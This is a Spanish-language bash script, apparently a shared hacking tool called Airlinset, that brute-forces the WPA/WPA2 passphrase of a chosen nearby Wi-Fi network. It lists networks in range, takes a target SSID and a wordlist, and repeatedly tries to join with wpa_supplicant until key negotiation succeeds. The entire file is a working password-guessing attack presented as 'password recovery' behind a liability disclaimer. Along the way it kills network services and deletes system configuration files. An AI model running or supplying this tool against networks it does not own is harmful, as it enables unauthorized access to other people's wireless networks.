#!/bin/bash

###############################################################################
# Fichero: Airlin                                                             #
# Fecha: 01/Dic/2012                                                          #
# Version: 1.0.1                                                              #
# Autor: Warcry (warcry7474@hotmail.com)                                      #
#                                                                             #
# Agradecimientos: Especial agradecimiento a Berni69  (www.bitsdelocos.es)    #
#                  y Niroz, que me han ayudado en el desarrollo               #
#                                                                             #
#                  y a todos los componentes del equipo de                    #
#                         www.seguridadwirless.net                            #
#				                                              #	·				                                              #
# El Autor no se responsabiliza del uso indebido que esta herramienta pueda   #
# tener, ya que el usuario tiene la obligación de utilizarla siempre acorde   #
# a la legislación vigente del país donde se utilice.                         #
#                                                                             #
# Este programa es software libre; puedes redistribuirlo y/o modificarlo      #
# bajo los terminos de la Licencia Publica General GNU (GPL) publicada        #
# por la Free Software Foundation; en su version numero 3, o (bajo tu         #
# criterio) la ultima version. Mira http://www.fsf.org/copyleft/gpl.txt       #
#                                                                             #
# Este programa se distribuye SIN GARANTIA de ningun tipo.                    #
#                                                                             #
#EL SCCRIPT ORIGINAL HA SIDO MODIFICADO POR JOZIC E. Y RODRIGO M.             #
#HA SIDO TOMADO DE LA PAGINA EL HACKER.NET Y MODIFICADO PARA SU OPTIMIZACION  #
#EL USO DE ESTE SOFTWARE Y SU PRESENTE MODIFICACION ES RESPONSABILIDAD DEL    #
#USUARIO Y NO DE LOS AUTORES DEL PROGRAMA NI DE LAS POSTERIORES MODIFICACIONES#
#                                                                             #
###############################################################################

function mostrarheader(){

echo -e '\e[1;32m#########################################################'
echo -e '\e[1;32m#                                                       #'
echo -e '\e[1;32m#''\e[1;33m			 Airlinset' '\e[1;32m                     #'
echo -e '\e[1;32m#''\e[1;33m	Created by Warcry Moodified by Enigma MJ''\e[1;32m        #'
echo -e '\e[1;32m#                                                       #'
echo -e '\e[1;32m#########################################################\e[0m'
}

clear
mostrarheader
#comprobacion de usuario

if [ $(whoami) != "root" ]; then
	
 echo -e '\e[1;31m
	
	
      DEBES SER USUARIO ROOT PARA CONTINUAR

        EN KALI PRUEBA: bash Airlin.sh

\e[0m' 

 exit 1

fi
echo -e '\e[1;34m


ESTA ES UNA HERRAMIENTA PARA LA RECUPERACION DE CONTRASEÑAS WPA/2
  PARA RECUPERAR CONTRASEÑAS WEP SE RECOMIENDA USAR WLANREAVER
 \e[0m'
 #variables

red=essid
ret=retardo
dic=dirname
key=line

#seleccion de parametros

echo -e '\e[1;37m \e[0m'
#crea lista con los interfaces wifi del sistema
if [ -z $1 ]; then
	interfaceList=$(iwconfig 2>/dev/null |grep "802.11" |grep -v Monitor |awk '{print $1}')
else
	interfaceList=$1; #si se indicó el dispositivo wifi como parametro de entrada
fi

echo -e '\e[1;31m NO SE MUESTRAN INTERFACES EN MODO MONITOR (COMO: mon0).
\t\tESTA APLICACION NO LOS UTILIZA.\n\e[0m'

if [ -z "$interfaceList" ]; then
	echo -e '\e[1;31m 
	
NO SE ENCONTRO NINGUNA INTERFACE WIRELESS O EN MODO MONITOR
   
	            NO SE PUEDE CONTINUAR.
	
	
	\e[0m'
	
	exit 1
fi

echo

#crea array con dispositivos WiFi existentes
i=0
for interface in $interfaceList; do

 if [ -z "`iwconfig 2>/dev/null |grep -A1 $interface|grep -i "Mode:Monitor"`" ]; then

	deviceList[i]=$interface
	i=`expr $i + 1`
	
 fi

done

#muestra menu para elegir dispositivo

echo -e "SELECCIONA EL DISPOSITIVO WI-FI QUE DESEAS UTILIZAR: "	

i=0
for device in ${deviceList[@]}; do
	echo " ["$i"]" $device
	i=`expr $i + 1` #let i=$i+1
done
echo -e "\n"	

#read -s -N 1 n  #leer un caracter en n, sin esperar intro -N 1, sin eco -s

read n  #leer un caracter en n, sin esperar intro -N 1, sin eco -s

device=${deviceList[n]}

echo -e '\e[1A\e[1;36mHAS SELECCIONADO: '$device "\nLOADING...."

sleep 2 #pausa dramatica XD

clear

mostrarheader

echo -e '\e[1;37m

SELECCIONA EL SSID (NOMBRE DE LA RED) 
\e[0m'

####################THIS IS A PROVE OF APLICATION FOR SCAN WIRELESS DIVICES SECTION IS NOT INCLUDE IN THE ORIGINAL CODE 

#AP=$(iwlist wlan1 scan | grep ESSID ) #muestra ssid al alcance
#echo -e "\n" $AP

#### COLOR SETTINGS ####
GREEN=$(tput setaf 2 && tput bold)
YELLOW=$(tput setaf 3 && tput bold)
BLUE=$(tput setaf 4 && tput bold)
MAGENTA=$(tput setaf 5 && tput bold)
CYAN=$(tput setaf 6 && tput bold)

echo $GREEN"REDES A TU ALCANCE:"
echo -e $YELLOW"\n\tSSID: \n"

function iwScan() {
   # disable globbing to avoid surprises
   set -o noglob
   # make temporary variables local to our function
   local AP S
   # read stdin of the function into AP variable
   while read -r AP; do
     ## print lines only containing needed fields
     [[ "${AP//'SSID: '*}" == '' ]] && printf '%b' "SSID: " "${AP/'SSID: '}\n"
   done
   set +o noglob
}

iwScan <<< "$(iw wlan0 scan)"

#########################################################################################################START 
	
echo -e '\e[1;31m

DEBE COINCIDIR EL NOMBRE COMPLETO INCLUYENDO MAYUSCULAS,
        MINUSCULAS Y SIMBOLOS ALFANUMERICOS\e[0m'
	
echo -e '\e[1;37m

ESCRIBE ESSID (NOMBRE DE RED):   \e[0m'
	
read red

clear

mostrarheader
###################################################################################################################
#Test if 

echo -e $CYAN"\nElige una opcion\n\n1:Diccionario personal\n\n2:Diccionario predeterminado\n"
read -p $BLUE"Opcion : " diccionario


if [ $diccionario -eq 1 ]; then 

clear
    
 echo -e '\e[1;37m \e[0m'

echo -e '\e[1;37m

SELECCIONA UN DICCIONARIO: 

ejemplo:\e[0m' '\e[1;36m  /root/Desktop/diccionario.txt\e[0m'

echo -e '\e[1;31m
PARA AGILIZAR EL PROCESO PUEDES ARRASTAR EL DICCCIONARIO HASTA LA CONSOLA\e[0m'

echo -e '\e[1;37m

TECLEA LA RUTA DEL DICCIONARIO: \e[0m'

read dirname

if [ -f $dirname ]; then continue

else

clear

mostrarheader

	echo -e '\e[1;31m 
	
NO HAY NINGUN DICCIONARIO EN LA RUTA ESPECIFICADA
   
	         NO SE PUEDE CONTINUAR.
	
	
	\e[0m'
	
	exit 1
fi


clear

mostrarheader

echo -e '\e[1;37m

SELECCION DE RETARDO
	
ejemplo: \e[0m' '\e[1;36m 5\e[0m'
	
echo -e '\e[1;31m

 ********EL RETARDO DEBE SER PUESTO EN SEGUNDOS********
RECUERDA QUE UN RETARDO DEMASIADO PEQUEÑO PUEDE CAUSAR QUE 
      LA CONTRASEÑA SEA IGNORADA POR LA APLICACION \e[0m'

echo -e '\e[1;37m

TECLEA EL RETARDO:  \e[0m'
	
read ret

#proceso de limpieza

echo "
	
LOADING...." 
	
	echo -e '\e[0;30m '; 

	ifconfig $device down
    
	killall -9 dhcpcd 2>/dev/null
	
	killall -9 wpa_supplicant 2>/dev/null
    
	rm -rf $/var/run/dhcpcd 2>/dev/null
    
	rm /var/run/dhcpcd-wlan0.pid 2>/dev/null
	
	sleep 1
	
	ifconfig $device up
	
	sleep 3
	

#establecimiento de conexion

for line in $(cat $dirname); do

 killall -9 wpa_supplicant 2>/dev/null

 rm /etc/wpa_supplicant.conf

 touch /etc/wpa_supplicant.conf
	
 rm airlintmp
	
 clear
 mostrarheader
	
 echo -e '\e[1;35m


	PROBANDO CLAVE
	    \n\e[0m''\t\e[1;33m '$line '\e[0;30m '

 echo -e "\n\n\n	"
    
 wpa_passphrase $red $line >> /etc/wpa_supplicant.conf

 wpa_supplicant -i$device -c/etc/wpa_supplicant.conf -f airlintmp 2>/dev/null & sleep $ret ;
	
	
 if ( grep -i 'WPA: Key negotiation completed' airlintmp ) ; then

  killall -9 wpa_supplicant 2>/dev/null	 '\e[0;30m '
  
clear

mostrarheader
		
  echo -e '\e[1;34m


	 LA CLAVE HA SIDO ENCONTRADA:\n\n\t\t\e[0m' '\e[1;36m '$line '\e[0;30m '
  
  echo -e '\e[1;33m		
		
	  CLAVE ENCONTRADA CON EXITO\e[0m\n\n''\e[0;30m ' ;
	
	break;
		
 fi

done #for
    

if [ -z "`grep -i 'WPA: Key negotiation completed' airlintmp`" ]; then
 
  killall -9 wpa_supplicant 2>/dev/null '\e[0;30m '


  clear
  
  mostrarheader
  
  echo -e '\e[1;31m  
  
      
      
      LA CLAVE NO SE ENCUENTRA DENTRO DEL DICCIONARIO
                    INTENTALO DE NUEVO.
  
  
  \e[0m''\e[0;30m '
fi

rm /etc/wpa_supplicant.conf 2>/dev/null
touch /etc/wpa_supplicant.conf 2>/dev/null
rm airlintmp 2>/dev/null


#########################################################################################################
elif [ $diccionario -eq 2 ]; then

clear

echo -e '\e[1;37m \e[0m'

echo -e '\e[1;37m

EL DICCIONARIO SE ESTA PREPARANDO...
\e[0m'
clear

mostrarheader

echo -e '\e[1;37m

SELECCION DE RETARDO
	
ejemplo: \e[0m' '\e[1;36m 5\e[0m'
	
echo -e '\e[1;31m

 ********EL RETARDO DEBE SER PUESTO EN SEGUNDOS********
RECUERDA QUE UN RETARDO DEMASIADO PEQUEÑO PUEDE CAUSAR QUE 
      LA CONTRASEÑA SEA IGNORADA POR LA APLICACION \e[0m'

echo -e '\e[1;37m

TECLEA EL RETARDO:  \e[0m'
	
read ret

#proceso de limpieza

echo "
	
LOADING...." 
	
	echo -e '\e[0;30m '; 

	ifconfig $device down
    
	killall -9 dhcpcd 2>/dev/null
	
	killall -9 wpa_supplicant 2>/dev/null
    
	rm -rf $/var/run/dhcpcd 2>/dev/null
    
	rm /var/run/dhcpcd-wlan0.pid 2>/dev/null
	
	sleep 1
	
	ifconfig $device up
	
	sleep 3
	

#establecimiento de conexion

for line in $(cat '/opt/pwnix/captures/prueba/shit.txt'); do

 killall -9 wpa_supplicant 2>/dev/null

 rm /etc/wpa_supplicant.conf

 touch /etc/wpa_supplicant.conf
	
 rm airlintmp
	
 clear
 mostrarheader
	
 echo -e '\e[1;35m


	PROBANDO CLAVE
	    \n\e[0m''\t\e[1;33m '$line '\e[0;30m '

 echo -e "\n\n\n	"
    
 wpa_passphrase $red $line >> /etc/wpa_supplicant.conf

 wpa_supplicant -i$device -c/etc/wpa_supplicant.conf -f airlintmp 2>/dev/null & sleep $ret ;
	
	
 if ( grep -i 'WPA: Key negotiation completed' airlintmp ) ; then

  killall -9 wpa_supplicant 2>/dev/null	 '\e[0;30m '
  
clear

mostrarheader
		
  echo -e '\e[1;34m


	  LA CLAVE HA SIDO ENCONTRADA:\n\n\t\t\e[0m' '\e[1;36m '$line '\e[0;30m '
  
  echo -e '\e[1;33m		
		
	  CLAVE ENCONTRADA CON EXITO\e[0m\n\n''\e[0;30m ' ;
	
	break;
		
 fi

done #for
    

if [ -z "`grep -i 'WPA: Key negotiation completed' airlintmp`" ]; then
 
  killall -9 wpa_supplicant 2>/dev/null '\e[0;30m '


  clear
  
  mostrarheader
  
  echo -e '\e[1;31m  
  
      
      
      LA CLAVE NO SE ENCUENTRA DENTRO DEL DICCIONARIO
                    INTENTALO DE NUEVO.
  
  
  \e[0m''\e[0;30m '
fi

rm /etc/wpa_supplicant.conf 2>/dev/null
touch /etc/wpa_supplicant.conf 2>/dev/null
rm airlintmp 2>/dev/null
#########################################################################################################
else   
    
clear

mostrarheader

	echo -e '\e[1;31m 
	
NO HAY NINGUN DICCIONARIO EN LA RUTA ESPECIFICADA
   
	         NO SE PUEDE CONTINUAR.
	
	
	\e[0m'
	
	exit 1
fi 




#END
